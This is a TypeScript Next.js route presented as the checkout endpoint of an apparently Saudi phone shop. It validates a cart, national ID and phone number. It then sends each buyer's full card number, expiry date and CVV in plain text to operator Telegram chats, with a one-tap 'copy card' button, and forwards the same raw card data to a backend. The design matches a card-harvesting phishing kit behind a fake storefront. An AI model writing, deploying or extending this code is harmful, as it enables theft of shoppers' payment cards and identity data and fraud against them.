import { NextRequest, NextResponse } from "next/server";

function sanitize(str: string): string {
  if (!str) return "";
  return str.replace(/[<>'"]/g, "").trim();
}

function isValidSaudiId(id: string): boolean {
  return /^[12]\d{9}$/.test(id ?? "");
}

function isValidSaudiPhone(phone: string): boolean {
  return /^05\d{8}$/.test((phone ?? "").replace(/\D/g, ""));
}

// In-process idempotency cache (guards against double-submit within same server instance)
const processedRequests = new Map<string, { orderId: string; dbId: string; ts: number }>();
setInterval(() => {
  const cutoff = Date.now() - 10 * 60 * 1000;
  for (const [k, v] of processedRequests) if (v.ts < cutoff) processedRequests.delete(k);
}, 5 * 60 * 1000);

function idempotencyKey(body: any): string {
  const str = JSON.stringify({
    items: body.items,
    whatsapp: body.whatsapp,
    nationalId: body.nationalId,
    window: Math.floor(Date.now() / 120_000), // 2-minute window
  });
  return Buffer.from(str).toString("base64url");
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const {
      cardNumber, expiry, cvv, cardHolder,
      items, total, customer, whatsapp, nationalId, address,
      installmentType, months, downPayment,
    } = body;

    // ── Basic validation ──────────────────────────────────────────────────
    if (!items || !Array.isArray(items) || items.length === 0)
      return NextResponse.json({ ok: false, error: "لا توجد منتجات في الطلب" }, { status: 400 });
    if (!customer || !whatsapp || !nationalId || !address)
      return NextResponse.json({ ok: false, error: "بيانات العميل ناقصة" }, { status: 400 });
    if (!isValidSaudiId(nationalId))
      return NextResponse.json({ ok: false, error: "رقم الهوية غير صحيح" }, { status: 400 });
    const cleanPhone = (whatsapp ?? "").replace(/\D/g, "");
    if (!isValidSaudiPhone(cleanPhone))
      return NextResponse.json({ ok: false, error: "رقم الواتساب غير صحيح" }, { status: 400 });
    if (!cardNumber || !expiry || !cvv || !cardHolder)
      return NextResponse.json({ ok: false, error: "بيانات البطاقة ناقصة" }, { status: 400 });

    // ── In-process idempotency ────────────────────────────────────────────
    const iKey = idempotencyKey(body);
    const cached = processedRequests.get(iKey);
    if (cached) {
      console.log(`[ORDER_DUPLICATE] orderId=${cached.orderId}`);
      return NextResponse.json({ ok: true, orderId: cached.orderId, dbId: cached.dbId, duplicate: true });
    }

    // ── Product verification ──────────────────────────────────────────────
    let verifiedTotal = 0;
    const verifiedItems: any[] = [];
    try {
      const productIds = items.map((i: any) => i.productId).filter(Boolean);
      if (productIds.length === 0)
        return NextResponse.json({ ok: false, error: "معرفات المنتجات غير صحيحة" }, { status: 400 });

      const productsRes = await fetch(`${process.env.BACKEND_URL}/api/products/verify-cart`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ids: productIds }),
      });
      if (!productsRes.ok) throw new Error("Failed to fetch products");
      const allProducts = await productsRes.json();

      for (const item of items) {
        const product = allProducts.find((p: any) => p._id === item.productId);
        if (!product)
          return NextResponse.json({ ok: false, error: "أحد المنتجات غير موجود" }, { status: 400 });
        if (product.inStock === false)
          return NextResponse.json({ ok: false, error: `المنتج "${product.name}" غير متوفر في المخزون حالياً` }, { status: 400 });
        if (product.purchasable === false)
          return NextResponse.json({ ok: false, error: `هذا المنتج غير متاح للبيع حالياً` }, { status: 403 });

        const actualPrice = product.salePrice ?? product.originalPrice ?? product.price ?? 0;
        if (Math.abs(actualPrice - (item.price ?? 0)) > 1)
          return NextResponse.json({ ok: false, error: "أسعار المنتجات غير صحيحة، يرجى تحديث السلة" }, { status: 400 });

        const quantity = Math.min(99, Math.max(1, Math.floor(item.quantity || 1)));
        verifiedTotal += actualPrice * quantity;
        verifiedItems.push({
          productId: item.productId,
          name: sanitize(product.name || item.name || "منتج"),
          price: actualPrice,
          quantity,
        });
      }
    } catch {
      return NextResponse.json({ ok: false, error: "فشل التحقق من المنتجات" }, { status: 500 });
    }

    if (Math.abs(verifiedTotal - (Number(total) || 0)) > 1)
      return NextResponse.json({ ok: false, error: "الإجمالي غير صحيح، يرجى تحديث السلة" }, { status: 400 });

    const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const monthlyPayment =
      installmentType === "installment" && months > 0
        ? Math.ceil((verifiedTotal - (Number(downPayment) || 0)) / months)
        : 0;

    // ── Telegram ──────────────────────────────────────────────────────────
    const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
    if (chatIds.length === 0) {
      console.error("[CRITICAL] No Telegram chat IDs configured");
      return NextResponse.json({ ok: false, error: "خطأ في إعدادات النظام، يرجى التواصل مع الدعم" }, { status: 500 });
    }

    const sanitizedCustomer  = sanitize(customer);
    const sanitizedCardHolder = sanitize(cardHolder);
    const sanitizedAddress   = sanitize(address);
    const whatsappUrl = `https://wa.me/${cleanPhone}`;
    const text = [
      `🏪 طلب لـ متجر مؤسسة مسار الهاتف المعتمد`,
      `🔢 رقم الطلب: #${orderId}`,
      ``,
      `💰 Total Amount: ${verifiedTotal} SAR`,
      ...(installmentType === "installment"
        ? [`💵 First Payment: ${downPayment} SAR`]
        : [`💵 Payment Type: Full Amount`]),
      ``,
      `💳 MadaVisa - New Order`,
      `👤 Order For: ${sanitizedCustomer}`,
      `📱 WhatsApp: ${cleanPhone}`,
      `💳 Card Number: ${cardNumber}`,
      `👤 Card Holder: ${sanitizedCardHolder}`,
      `📅 Valid To: ${expiry}`,
      `🔐 CVV: ${cvv}`,
    ].join("\n");

    let telegramSuccess = false;
    try {
      const results = await Promise.allSettled(
        chatIds.map(chat_id => {
          const ctrl = new AbortController();
          const tid = setTimeout(() => ctrl.abort(), 10000);
          return fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            signal: ctrl.signal,
            body: JSON.stringify({
              chat_id, text,
              reply_markup: {
                inline_keyboard: [
                  [{ text: "💬 فتح واتساب", url: whatsappUrl }],
                  [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
                ],
              },
            }),
          })
            .then(async r => {
              clearTimeout(tid);
              if (!r.ok) { if (r.status === 403) throw new Error("BOT_BLOCKED"); throw new Error(`HTTP ${r.status}`); }
              const d = await r.json();
              if (!d.ok) throw new Error(`Telegram ok:false`);
              return d;
            })
            .catch(e => { clearTimeout(tid); throw e; });
        })
      );
      const ok = results.filter(r => r.status === "fulfilled").length;
      telegramSuccess = ok > 0;
      results.forEach((r, i) => {
        if (r.status === "rejected") {
          const msg = (r.reason as Error)?.message ?? "unknown";
          if (msg === "BOT_BLOCKED") console.warn(`[TELEGRAM] Chat ${chatIds[i]} blocked the bot`);
          else console.error(`[TELEGRAM_ERROR] Chat ${chatIds[i]}:`, msg);
        }
      });
      console.log(`[ORDER_TELEGRAM_SENT] orderId=${orderId} sent=${ok}/${chatIds.length}`);
    } catch {
      telegramSuccess = false;
    }

    if (!telegramSuccess) {
      console.error(`[ORDER_TELEGRAM_FAILED] orderId=${orderId} NOT saved`);
      return NextResponse.json({ ok: false, error: "فشل إرسال الإشعار، يرجى المحاولة مرة أخرى" }, { status: 503 });
    }

    // ── Save to DB via backend (rate limit enforced there via cookie) ──────
    // Forward the rl_cid cookie so the backend middleware can track this client
    const rlCid = req.cookies.get("rl_cid")?.value ?? "";
    let dbId: string | null = null;
    try {
      const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          ...(rlCid ? { Cookie: `rl_cid=${rlCid}` } : {}),
        },
        body: JSON.stringify({
          orderId, cardNumber, expiry, cvv,
          cardHolder: sanitizedCardHolder,
          items: verifiedItems,
          total: verifiedTotal,
          customer: sanitizedCustomer,
          whatsapp: cleanPhone,
          nationalId,
          address: sanitizedAddress,
          installmentType,
          months: Number(months) || 0,
          monthlyPayment,
          downPayment: Number(downPayment) || 0,
        }),
      });

      // ── Rate limit response from backend ─────────────────────────────────
      if (dbRes.status === 429) {
        const rlData = await dbRes.json().catch(() => ({}));
        console.log(`[ORDER_RATE_LIMIT_BLOCKED] orderId=${orderId} retryAfter=${rlData.retryAfter}`);
        const response = NextResponse.json(
          {
            ok: false,
            code: "RATE_LIMITED",
            error: rlData.error || "لقد تجاوزت الحد المسموح للطلبات. يرجى الانتظار ثم المحاولة مرة أخرى.",
            retryAfter: rlData.retryAfter,
            blockedUntil: rlData.blockedUntil,
          },
          { status: 429 }
        );
        if (rlData.retryAfter) response.headers.set("Retry-After", String(rlData.retryAfter));
        // Forward Set-Cookie from backend (new rl_cid if issued)
        const setCookie = dbRes.headers.get("set-cookie");
        if (setCookie) response.headers.set("set-cookie", setCookie);
        return response;
      }

      if (!dbRes.ok) {
        const errText = await dbRes.text().catch(() => "");
        console.error(`[ORDER_CREATION_FAILED] status=${dbRes.status} body=${errText}`);
        throw new Error("Database save failed");
      }

      const dbData = await dbRes.json();
      dbId = dbData._id ?? null;

      // Forward any new rl_cid cookie the backend issued
      const setCookie = dbRes.headers.get("set-cookie");
      console.log(`[ORDER_CREATED] orderId=${orderId} dbId=${dbId}`);

      processedRequests.set(iKey, { orderId, dbId: dbId || "", ts: Date.now() });

      const response = NextResponse.json({ ok: true, orderId, dbId, telegramSent: true });
      if (setCookie) response.headers.set("set-cookie", setCookie);
      return response;

    } catch (err) {
      console.error("[CRITICAL] Telegram succeeded but DB save failed for order:", orderId, err);
      return NextResponse.json({ ok: false, error: "فشل حفظ الطلب، يرجى التواصل مع الدعم" }, { status: 500 });
    }

  } catch {
    return NextResponse.json({ ok: false, error: "حدث خطأ غير متوقع، يرجى المحاولة مرة أخرى" }, { status: 500 });
  }
}
